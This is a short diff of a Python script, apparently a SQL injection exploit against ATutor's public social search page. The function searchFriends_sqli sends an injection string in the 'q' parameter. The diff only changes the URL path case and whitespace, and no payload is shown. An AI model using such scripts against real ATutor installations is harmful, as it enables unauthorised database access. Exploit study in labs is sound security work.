@@ -1,10 +1,10 @@
 import sys 
 import re 
-import requests 
+import requests
 from bs4 import BeautifulSoup 
 
 def searchFriends_sqli(ip, inj_str):
-  target = "http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" % (ip, inj_str) 
+  target = "http://%s/atutor/mods/_standard/social/index_public.php?q=%s" % (ip, inj_str) 
   r = requests.get(target)
   s = BeautifulSoup(r.text, 'lxml') 
   
